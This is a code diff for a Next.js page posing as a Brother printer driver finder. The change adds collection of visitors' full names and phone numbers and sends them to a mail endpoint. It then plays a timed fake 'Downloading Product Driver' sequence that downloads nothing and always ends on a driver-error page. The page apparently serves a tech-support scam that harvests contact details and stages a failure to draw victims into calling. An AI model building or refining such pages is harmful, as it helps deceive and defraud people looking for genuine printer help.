@@ -1,10 +1,10 @@
 "use client";
 
 import Image from "next/image";
+import Link from "next/link";
 import { useRouter } from "next/navigation";
 import { useState, useEffect } from "react";
-import SupportGrid from "./SupportGrid";
-import Link from "next/link";
+
   const hero = "/images/gif.gif";
   const printerImage = "/images/brother.png";
 
@@ -19,46 +19,50 @@ export default function BrotherPrinter() {
   const totalSteps = 3;
 
   const handleSubmit = async (e) => {
-    e.preventDefault();
-    setLoading(true);
-    setStep(0);
+  e.preventDefault();
+  setLoading(true);
+  setStep(0);
 
-    try {
-      const res = await fetch("/api/bromail", {
-        method: "POST",
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({ bromodel }),
-      });
+  try {
+    const res = await fetch("/api/drivermail", {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({
+        fullName,
+        phoneNumber,
+        bromodel, // printer model
+      }),
+    });
 
-      const data = await res.json();
+    const data = await res.json();
 
-      if (data.success) {
-        // Start step simulation
-        let currentStep = 0;
-        const interval = setInterval(() => {
-          currentStep++;
-          setStep(currentStep);
-          if (currentStep >= totalSteps) {
-            clearInterval(interval);
-            setTimeout(() => router.push("/driver-error"), 500);
-          }
-        }, 1000);
-      } else {
-        alert("Failed to send email.");
-        setLoading(false);
-      }
-    } catch (err) {
-      console.error(err);
-      alert("Error sending email.");
+    if (data.success) {
+      let currentStep = 0;
+      const interval = setInterval(() => {
+        currentStep++;
+        setStep(currentStep);
+        if (currentStep >= totalSteps) {
+          clearInterval(interval);
+          setTimeout(() => router.push("/driver-error"), 500);
+        }
+      }, 1000);
+    } else {
+      alert(data.message || "Failed to send email.");
       setLoading(false);
     }
-  };
+  } catch (err) {
+    console.error(err);
+    alert("Error sending email.");
+    setLoading(false);
+  }
+};
+
 
   return (
     <>
       {!loading ? (
         <>
-<div className="min-h-screen broprinter bg-gray-100 flex flex-col items-center py-10">
+<div className="min-h-screen bg-gray-100 flex flex-col items-center py-10">
       {/* Find Drivers Form */}
       <form
         className="bg-white p-6 rounded-lg shadow-lg flex flex-col md:flex-row gap-4 items-center"
@@ -106,19 +110,17 @@ export default function BrotherPrinter() {
           <p className="mb-6">
             Click Printer Setup for step by step guidance on how to setup, configure and register your printer.
           </p>
-          <Link href="/driver-setup" className="bg-blue-600 text-white px-6 py-3 rounded hover:bg-blue-700 transition">
-            RUN PRINTER SETUP
-          </Link>
+    
           <p className="mt-4 text-sm">
-            For Assistance Please <a href="/contact-us" className="text-blue-600 underline">Contact Us</a>
-          </p>driver-setup
+            For Assistance Please <Link href="/contact-us" className="text-blue-600 underline">Contact Us</Link>
+          </p>
         </div>
         <div className="flex-1">
           <Image src={printerImage} width={800} height={480} alt="Printer Setup" />
         </div>
       </div>
     </div>
-    <SupportGrid />
+ 
         </>
       ) : (
         
@@ -129,7 +131,7 @@ export default function BrotherPrinter() {
  <h1>Driver Loading</h1>
 </div>
 <div className="mtside">
-  <div className="p-8 flex flex-col  items-center justify-center">
+  <div className="p-8 flex flex-col items-center justify-center">
             <h3 className="text-xl">Downloading Product Driver</h3>
             <div
               style={{
